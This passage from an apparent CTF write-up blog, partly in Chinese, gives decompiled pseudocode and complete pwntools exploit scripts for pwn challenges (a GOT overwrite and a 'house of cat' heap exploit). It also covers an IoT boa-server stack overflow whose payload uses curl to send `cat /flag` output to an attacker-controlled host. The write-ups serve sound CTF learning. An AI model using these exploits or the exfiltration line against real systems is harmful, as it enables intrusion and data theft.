__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v6, v2, v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let me think......&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">338150</span> || v6 != <span class="hljs-number">13371337</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Failed! Try again.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG!YOU SUCCESS!&quot;</span>);<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="思路">思路</h4><p>ida的伪代码存在一定的误导性，初看代码以为是利用栈未初始化，控制变量的值绕过判断，再看才知道是利用栈未初始化，实现任意地址写</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&quot;Wal1et&quot;</span>)<br><br>p=process(<span class="hljs-string">&#x27;Wal1et&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;EXIT&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>data1=e.bss(<span class="hljs-number">0x200</span>)<br>data2=e.bss(<span class="hljs-number">0x200</span>)<br>exit_=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(exit_))<br>backdoor=<span class="hljs-number">0x804872d</span><br>p.sendlineafter(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p32(exit_))<br>p.sendlineafter(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-built_in">str</span>(backdoor))<br>p.sendlineafter(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="pwn2">pwn2</h3><h4 id="main伪代码-2">main伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)getint() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        add();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        delete();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        show();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        backdoor();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="add伪代码">add伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !ptr )<br>  &#123;<br>    sub_12EB(<span class="hljs-string">&quot;1: small 2:big&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)getint() == <span class="hljs-number">1</span> )<br>    &#123;<br>      ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>      read(<span class="hljs-number">0</span>, ptr, <span class="hljs-number">0x20</span>uLL);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>uLL);<br>      read(<span class="hljs-number">0</span>, ptr, <span class="hljs-number">0xF0</span>uLL);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="delete伪代码">delete伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( ptr )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_12EB(<span class="hljs-string">&quot;wrong&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="show伪代码">show伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( ptr )<br>    sub_12EB(ptr);<br>  <span class="hljs-keyword">else</span><br>    sub_12EB(<span class="hljs-string">&quot;wrong&quot;</span>);<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="backdoor伪代码">backdoor伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16uLL</span>);<br>  <span class="hljs-keyword">return</span> v1 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="思路-2">思路</h4><p>当使用<code>模式1</code>创建<code>chunk</code>时，只能修改下一个<code>chunk</code>的size<br>当使用<code>模式2</code>创建<code>chunk</code>时，允许溢出0x98个字节<br>所以当想要获取数据时先创建<code>模式1</code>，后创建<code>模式2</code>，方便后续清理<code>bins</code><br>可以利用<code>default</code>代码中申请的<code>0x1010</code>大小的<code>chunk</code>,方便我们将<code>chunk</code>放入<code>unsorted bin</code>中</p><h5 id="利用过程">利用过程</h5><ol><li>主要利用部分是先创建<code>模式2</code>，后创建<code>模式1</code>，利用<code>模式2</code>的<code>chunk</code>，使<code>模式1</code>创建的<code>chunk</code>与<code>default</code>创建的<code>chunk</code>合并，这样可以在<code>unsorted bin</code>中放置一个<code>模式1</code>大小的<code>chunk</code></li><li>在<code>unsorted bin</code>中放好<code>chunk</code>之后,利用<code>模式2</code>的<code>chunk</code>构造<code>payload</code>使<code>模式2</code>中的<code>fake chunk</code>与(<code>模式1</code>与<code>default</code>融合之后的<code>chunk</code>)合并</li><li>这时再次利用<code>模式2</code>将合并之后的<code>fake chunk</code>的<code>size</code>修改为<code>0x20</code>,这时<code>unsorted bin</code>中就存在两个<code>0x20</code>大小的<code>chunk</code>,并且<code>tcache bin</code>中不存在<code>0x20</code>大小的<code>chunk</code></li><li>这时再申请一个<code>模式1</code>的<code>chunk</code>,这个<code>chunk</code>就是我们的<code>fake chunk</code>,并且我们之前放在<code>unsorted bin</code>中的<code>chunk</code>会放进<code>tcache bin</code>中</li><li>这样就可以实现任意地址读写一次,我选择修改<code>_IO_libc_all</code>指向我在堆中构造好的<code>house of cat</code>的<code>payload</code></li><li>这个时候只要执行<code>exit函数</code>就可以获取<code>shell</code></li></ol><h4 id="exp-2">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">code,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;bi&#x27;</span>,<span class="hljs-built_in">str</span>(code).encode())<br>    time.sleep(<span class="hljs-number">0.5</span>) <span class="hljs-comment"># 参数根据实际情况修改，或使用pause</span><br>    <span class="hljs-comment">#pause()</span><br>    p.sendafter(<span class="hljs-string">&#x27;g&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>info(<span class="hljs-string">&quot;get info start&quot;</span>)<br><br>add(<span class="hljs-number">1</span>)<br>free()<br>add(<span class="hljs-number">2</span>)<br>free()<br>add(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x1071</span>))<br>p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;123&#x27;</span>)<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br><br>free()<br>add(<span class="hljs-number">2</span>)<br>free()<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>show()<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21b361</span><br>success(<span class="hljs-string">f&quot;libcbase=0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br><br>free()<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>))<br>free()<br>add(<span class="hljs-number">2</span>)<br>free()<br>add(<span class="hljs-number">1</span>)<br>show()<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n1:&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc(d)&amp;(~<span class="hljs-number">0xfff</span>)<br>chunk1=heap+<span class="hljs-number">0x290</span><br>chunk2=chunk1+<span class="hljs-number">0x60</span><br>success(<span class="hljs-string">f&quot;heap_addr=0x<span class="hljs-subst">&#123;heap:x&#125;</span>&quot;</span>)<br>free()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;123&#x27;</span>)<br>alloc()<br>alloc()<br>info(<span class="hljs-string">&quot;get info end&quot;</span>)<br><br><br><br>info(<span class="hljs-string">&quot;make house of cat start&quot;</span>)<br>fake_io_add=heap+<span class="hljs-number">0x13e0</span><br>fake_io=p64(<span class="hljs-number">0x2020202020202020</span>)+p64(<span class="hljs-number">0x68732f6e69622f</span>)+\<br>    p64(system)+p64(system)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br><br>fake_io2=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+\<br>        p64(wfile_jump)+\<br>    p64(<span class="hljs-number">0</span>)+p64(fake_io_add-<span class="hljs-number">0x50</span>)<br><br>wide_file=fake_io_add+<span class="hljs-number">0x8</span><br><br><br>add(<span class="hljs-number">1</span>)<br>free()<br>add(<span class="hljs-number">2</span>)<br>free()<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>))<br>alloc()<br>alloc()<br>free()<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+fake_io)<br>free()<br>alloc()<br>alloc()<br><br>add(<span class="hljs-number">1</span>)<br>free()<br>add(<span class="hljs-number">2</span>)<br>free()<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(wide_file)+p64(<span class="hljs-number">0x21</span>))<br>alloc()<br>alloc()<br>free()<br>add(<span class="hljs-number">2</span>,fake_io2)<br>free()<br>alloc()<br>alloc()<br><br>info(<span class="hljs-string">&quot;make house of cat end&quot;</span>)<br><br>info(<span class="hljs-string">&quot;manage tcache bin&quot;</span>)<br>add(<span class="hljs-number">2</span>)<br>free()<br>add(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;123&#x27;</span>)<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br>alloc()<br>free()<br><br>chunk_=heap+<span class="hljs-number">0x1530</span><br><br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x1011</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x80</span>))<br>free()<br>add(<span class="hljs-number">1</span>)<br>free()<br>add(<span class="hljs-number">1</span>)<br>alloc()<br>alloc()<br>p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;123&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;123&#x27;</span>)<br>free()<br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(chunk_+<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x21</span>)+p64(chunk_+<span class="hljs-number">0x30</span>-<span class="hljs-number">0x18</span>)+p64(chunk_+<span class="hljs-number">0x30</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x1030</span>)<br>add(<span class="hljs-number">2</span>,payload)<br>free()<br>add(<span class="hljs-number">1</span>)<br>alloc()<br>free()<br><br>unsorted_bin=libc.address+<span class="hljs-number">0x21ace0</span><br>chunk_1=heap+<span class="hljs-number">0x2610</span><br>add(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(chunk_1)+p64(unsorted_bin)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x20</span>))<br>free()<br>add(<span class="hljs-number">1</span>)<br>free()<br>info(<span class="hljs-string">&quot;manage tcache bin ok&quot;</span>)<br><br>target=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>chunk_2=heap+<span class="hljs-number">0x1570</span><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x21</span>)+p64(target^(chunk_2&gt;&gt;<span class="hljs-number">12</span>))<br>add(<span class="hljs-number">2</span>,payload)<br>alloc()<br>free()<br>add(<span class="hljs-number">1</span>,p64(fake_io_add))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;show\n&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive() <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024西湖论剑-初赛</title>
    <link href="/page/wp/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/page/wp/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="iot">iot</h1><h2 id="easygetaway">easygetaway</h2><h3 id="分析">分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;&quot;&quot;<br>start.sh<br>&quot;&quot;&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>echo &quot;fake_passwd&quot; &gt; /tmp/passwd ; chmod 777 /tmp/passwd<br><br>while true;<br>do<br>    /home/ctf/qemu-arm-static -L /home/ctf/ /home/ctf/boa -f /home/ctf/boa.conf -c /home/ctf/html | su - ctf<br>    sleep 2<br>done<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">sleep</span> infinity;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/easygetaway.png" srcset="/img/loading.gif" lazyload alt=""></p><p>题目中自定义了一个函数用于验证<code>Authorization</code>头的内容</p><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/easygetaway-1.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在验证函数中首先取出<code>Basic</code>后面的内容，进行<code>base64</code>解密，然后放入<code>sub_16698</code>中进行比较</p><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/easygetaway-2.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在base64解密函数中，如果手动将结尾应有<code>=</code>去掉，则会导致堆溢出，不过仅能溢出一两个字节，不过这种利用方式我不会</p><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/easygetaway-3.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在比较函数中，使用<code>sprintf</code>格式化了一个字符串，因为传入的<code>a3</code>、<code>a4</code>的长度没有限制，所以这里存在栈溢出漏洞，而且因为程序是<code>32位程序</code>，不用担心构造<code>payload</code>的时候出现<code>00截断</code>导致<code>payload</code>无法攻击成功</p><h3 id="问题">问题</h3><p>那么还剩下一个问题，程序开启了<code>PIE</code>保护<br>在经过我日思夜想，不断努力的思考下，发现使用<code>qemu-user</code>启动程序时，即使程序开启了<code>PIE</code>保护，但程序的基址依旧不会改变</p><blockquote><p>也可能是我的环境有问题，如果你看到这里可以自己尝试一下</p></blockquote><h3 id="exp">exp</h3><p>假设上面<code>qemu-user</code>启动程序时程序基址不变的条件成立，那么<code>exp</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>  <br>url=<span class="hljs-string">&#x27;http://192.168.158.128:8088/&#x27;</span><br>payload=(<span class="hljs-number">0x3ffffa0c</span>.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;little&#x27;</span>)+\<br><span class="hljs-number">0x400168a4</span>.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;little&#x27;</span>)+\<br><span class="hljs-string">b&#x27;curl http://192.168.158.128:4444/`cat /flag` &amp;&amp;:&#x27;</span>).ljust(<span class="hljs-number">0x12c</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+\<br><span class="hljs-number">0x3ffffa08</span>.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;little&#x27;</span>)+\<br><span class="hljs-number">0x40010C98</span>.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>  <br>requests.get(url,headers=&#123;<span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">b&quot;Basic &quot;</span>+base64.b64encode(payload)&#125;)<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/easygetaway-4.png" srcset="/img/loading.gif" lazyload alt=""></p><blockquote><p>成功^v^</p></blockquote><h2 id="hardgateway">hardgateway</h2><h3 